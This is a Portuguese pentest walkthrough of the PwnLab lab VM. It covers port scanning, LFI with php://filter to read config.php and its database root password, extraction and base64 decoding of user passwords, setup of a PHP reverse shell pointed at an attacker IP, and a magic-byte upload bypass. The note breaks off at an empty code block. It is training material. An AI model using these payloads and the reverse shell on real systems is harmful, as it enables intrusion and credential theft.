
2025-12-19 22:08

Status:

Tags:

----
# Introdução

Este documento detalha o processo de exploração de vulnerabilidades na aplicação web **PwnLab**, um ambiente de laboratório projetado para prática de técnicas de pentest web. O objetivo é identificar e explorar falhas de segurança comuns em aplicações web, seguindo uma metodologia estruturada que inclui reconhecimento, mapeamento, exploração e pós-exploração.

![[Pasted image 20251220013815.png]]

A aplicação PwnLab apresenta múltiplas vulnerabilidades intencionais, incluindo ***Local File Inclusion*** (LFI), **injeção SQL**, **upload inseguro de arquivos** e **configurações inadequadas de banco de dados**. Este guia percorrerá cada etapa do processo, desde o reconhecimento inicial até o comprometimento completo do sistema.

---
# Metodologia Utilizada

A abordagem segue as fases padrão de testes de penetração em aplicações web:

1. **Reconhecimento e Enumeração** - Identificação de serviços e endpoints.
2. **Mapeamento de Vulnerabilidades** - Scan automatizado e manual.
3. **Exploração** - Utilização das vulnerabilidades identificadas.
4. **Escalação de Privilégios** - Acesso a dados sensíveis e sistemas.
5. **Pós-Exploração** - Manutenção de acesso e coleta de evidências.

---
# Fase 1: Reconhecimento e Enumeração

## 1.1 Reconhecimento de Portas e Serviços

Antes de iniciar o ataque à aplicação web, é crucial identificar todos os serviços expostos no sistema alvo. Utilizamos o Nmap para um scan básico de portas.

```bash
# Scan básico das 1000 portas mais comuns
nmap -sV -sC 192.168.100.77

# Scan completo de todas as portas (recomendado para ambientes de teste)
nmap -p- 192.168.100.77

# Resultado identificado:
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
111/tcp  open  rpcbind    2-4 (RPC #100000)
3306/tcp open  mysql      MySQL 5.5.5-10.3.15-MariaDB-1
```

**Análise dos Resultados:**

- **Porta 80 (HTTP):** Servidor web Apache rodando aplicação PwnLab
- **Porta 3306 (MySQL):** Serviço de banco de dados exposto
- **Porta 111 (RPCBind):** Serviço de chamada de procedimento remoto

## 1.2 Enumeração de Diretórios Web

Antes de utilizar ferramentas automatizadas, realizamos enumeração manual básica:

```bash
# Teste de endpoints comuns
curl -I http://192.168.100.77/
curl -I http://192.168.100.77/robots.txt
curl -I http://192.168.100.77/sitemap.xml
```

---
# Fase 2: Mapeamento de Vulnerabilidades com Metasploit

## 2.1 Configuração do WMAP no Metasploit

```bash
# Iniciar Metasploit Framework
sudo msfconsole

# Iniciar BD do Metasploit
msfdb init

# Carregar o módulo WMAP
load wmap

# Listar comandos disponíveis do WMAP
wmap_help

# Adicionar o site alvo
wmap_sites -a http://192.168.100.77

# Verificar sites adicionados
wmap_sites -l

# Adicionar página específica como target
wmap_targets -t http://192.168.100.77/?page=login

# Configurar opções de scan (opcional)
wmap_run -h

# Executar o scan de vulnerabilidades
wmap_run -e
```

```bash
[*] Testing target: http://192.168.100.77:80/
[*] Loading modules...
[+] Loaded 35 modules
[+] Launching 35 plugins...

# Resultados importantes identificados:
[+] Found http://192.168.100.77:80/config.php 200
[+] Found http://192.168.100.77:80/index.php 200  
[+] Found http://192.168.100.77:80/login.php 200
[+] Found http://192.168.100.77:80/upload.php 200
[+] Possible LFI vulnerability detected in parameter: page
```

**Análise Crítica dos Resultados:**

1. `config.php` **acessível:** Arquivo de configuração que normalmente não deveria ser acessível publicamente
2. **Parâmetro `page` vulnerável:** Indicação de possível Local File Inclusion (LFI)
3. `upload.php`: Ponto potencial para upload de arquivos maliciosos

## 2.3 Validação Manual de Vulnerabilidades LFI

Após a identificação automática, validamos manualmente a vulnerabilidade:

```bash
# Teste básico de LFI usando path traversal
curl "http://192.168.100.77/?page=../../../../etc/passwd"

# Teste com wrappers PHP
curl "http://192.168.100.77/?page=php://filter/convert.base64-encode/resource=index"

# Exploração bem-sucedida para config.php
curl "http://192.168.100.77/?page=php://filter/convert.base64-encode/resource=config"
```

**Resposta do Servidor:**

```text
PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+
```

## 2.4 Decodificação e Análise do Arquivo Config

```bash
# Decodificar conteúdo base64
echo "PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+" | base64 -d
```

**Conteúdo Decodificado:**

```php
<?php
$server    = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

**Riscos Identificados:**

1. Credenciais de banco de dados em arquivo acessível.
2. Usuário root com alta permissão.
3. Senha aparentemente forte mas agora comprometida.
4. Nome do banco de dados exposto.

---
# Fase 3: Exploração - Acesso ao Banco de Dados MySQL

## 3.1 Conexão com o MySQL

Com as credenciais obtidas, conectamos ao banco de dados:

```bash
# Conectar ao MySQL (desabilitar SSL se necessário)
mysql -u root -p -h 192.168.100.77 --ssl=DISABLED

# Alternativa com porta explícita
mysql -u root -p -h 192.168.100.77 -P 3306

# Durante a conexão, usar a senha encontrada: H4u%QJ_H99
```

>[!note] Nota de Segurança:
>Em ambientes de produção, conexões MySQL devem usar SSL/TLS. A flag `--ssl-mode=DISABLED` só deve ser usada em ambientes controlados de teste.


## 3.2 Enumeração do Banco de Dados

```mysql
-- Listar todos os bancos de dados
SHOW DATABASES;

-- Resultado esperado:
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+

-- Selecionar o banco de dados alvo
USE Users;

-- Listar tabelas do banco selecionado
SHOW TABLES;

-- Resultado esperado:
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+

-- Examinar estrutura da tabela users
DESCRIBE users;

-- Resultado esperado:
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| user  | varchar(255) | YES  |     | NULL    |       |
| pass  | varchar(255) | YES  |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
```

## 3.3 Extração de Credenciais

```mysql
-- Consultar todos os registros da tabela users
SELECT * FROM users;

-- Resultado:
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
```

## 3.4 Decodificação das Senhas em Base64

```bash
# Decodificar senha do usuário kent
echo "Sld6WHVCSkpOeQ==" | base64 -d
# Resultado: JWzXuBJJNy

# Decodificar senha do usuário mike  
echo "U0lmZHNURW42SQ==" | base64 -d
# Resultado: SIfdsTEn6I

# Decodificar senha do usuário kane
echo "aVN2NVltMkdSbw==" | base64 -d
# Resultado: iSv5Ym2GRo
```

## 3.5 Análise de Segurança das Credenciais


| **Usuário** | **Senha (Base64)** | **Senha (Decodificada)** | **Complexidade**          |
| ----------- | ------------------ | ------------------------ | ------------------------- |
| kent        | Sld6WHVCSkpOeQ==   | JWzXuBJJNy               | Média (10 chars, mistura) |
| mike        | U0lmZHNURW42SQ==   | SIfdsTEn6I               | Média (10 chars, mistura) |
| kane        | aVN2NVltMkdSbw==   | iSv5Ym2GRo               | Média (10 chars, mistura) |

**Problemas Identificados:**

1. Senhas armazenadas em Base64 (não é hashing)
2. Mesmo formato para todos os usuários
3. Nenhum salting aplicado
4. Comprimento consistente de 10 caracteres

---
# Fase 4: Exploração de Upload de Arquivos e Reveres Shell

## 4.1 Contexto e Objetivo

Após obter acesso à aplicação através das credenciais dos usuários (kent, mike ou kane) identificamos a funcionalidade de upload de arquivos em `/upload.php`. Nosso objetivo é explorar esta funcionalidade para obter uma shell reversa, permitindo execução remota de comandos no servidor.

## 4.2 Análise de Funcionalidades de Upload

1. Login na aplicação
	- Acesse `http://192.168.100.77/login.php`
	- Utilize as credenciais obtidas anteriormente (ex: kent:JWzXuBJJNy)
	- Após login bem-sucedido, navegue até a página de upload

2.  **Identificação do formulário:**
    - Localize o formulário de upload na interface
    - Observe os campos disponíveis
    - Verifique mensagens de ajuda ou instruções

![[Pasted image 20251220022143.png]]

3. **Análise visual das restrições:**
    - Verifique se há indicação de tipos de arquivo permitidos
    - Observe mensagens de erro ao tentar uploads inválidos
    - Analise se há validação em tempo real (JavaScript)

## 4.2 Teste Manual de Upload

Execute os seguintes testes diretamente na interface web:

**Teste 1: Upload de arquivo de imagem válido**

- Selecione uma imagem real (JPG, PNG, GIF)
- Faça upload e observe:
    
    - Mensagem de sucesso/erro
    - Local onde a imagem é exibida
    - URL de acesso ao arquivo

![[Pasted image 20251220022314.png]]

**Teste 2: Tentativa de upload de arquivo PHP**

- Crie um arquivo `test.php` com conteúdo simples:

```php
<?php echo "Test PHP"; ?>
```

- Tente fazer upload através da interface
- **Resultado Esperado:** A aplicação deve rejeitar o upload

![[Pasted image 20251220022534.png]]

**Teste 4: Verificação de uploads anteriores**

- Explore a interface para ver se há galeria de imagens
- Verifique URLs de imagens já upadas em `/upload`
- Analise padrões de nomenclatura

![[Pasted image 20251220022245.png]]

---
# Fase 5: Preparação do Arquivo de Reverse Shell

## 5.1 Localização do Template de Reverse Shell

O Kali Linux inclui diversos templates de webshells. Vamos utilizar:

```bash
# Localizar o arquivo php-reverse-shell.php
find /usr/share -name "*reverse*shell*.php" 2>/dev/null

# Caminho específico no Kali
ls -la /usr/share/webshells/php/

# Copiar o template para seu diretório de trabalho
cp /usr/share/webshells/php/php-reverse-shell.php ./reverse-shell.php
```

## 5.2 Configuração do Arquivo

Abra o arquivo `reverse-shell.php` em um editor de texto:

```bash
# Visualizar conteúdo inicial
head -30 /usr/share/webshells/php/php-reverse-shell.php
```

O arquivo contém:

```bash
# /*
# Pentest Monkey Reverse Shell PHP
# */
# set_time_limit (0);
# $VERSION = "1.0";
# $ip = '127.0.0.1';  // CHANGE THIS
# $port = 1234;       // CHANGE THIS
```

Edite as seguintes variáveis:

1. **Altere o IP (`$ip`)**: Substitua `127.0.0.1` pelo **seu endereço IP atacante**

```php
$ip = '192.168.100.50';  // SEU IP
```

2. **Altere a porta (`$port`)**: Use uma porta disponível (ex: 1234, 4444, 5555)

```php
$port = 1234;
```

3. **(Opcional) Verificar método de conexão**: O script usa `fsockopen()`. Verifique se suporta outros métodos se necessário.

## 5.3 Verificação do Arquivo Configurado

```bash
# Verificar as alterações
grep -n "ip\|port" reverse-shell.php

# Resultado esperado:
# $ip = '192.168.100.50';
# $port = 1234;
```

---
# Fase 6: Bypass de Validação com Magic Bytes

## 6.1 O que são Magic Bytes?

Magic Bytes (assinaturas de arquivo) são sequências específicas nos primeiros bytes de um arquivo que identificam seu formato:

**Exemplos comuns:**

- **GIF**: `GIF89a` (47 49 46 38 39 61 em hexadecimal)
- **JPEG**: `ÿØÿà` (FF D8 FF E0 em hexadecimal)
- **PNG**: `‰PNG` (89 50 4E 47 em hexadecimal)
- **PDF**: `%PDF` (25 50 44 46 em hexadecimal)

## 6.2 Estratégia de Bypass

Como a aplicação só aceita imagens, mas valida apenas a extensão e/ou magic bytes, podemos:

1. **Adicionar magic bytes de imagem ao início do arquivo PHP**
2. **Manter a extensão .gif para passar na validação**
3. **O código PHP será executado pois o servidor interpreta pelo conteúdo, não pela extensão**

## 6.3 Criação do Arquivo Híbrido GIF/PHP

```bash
 
```

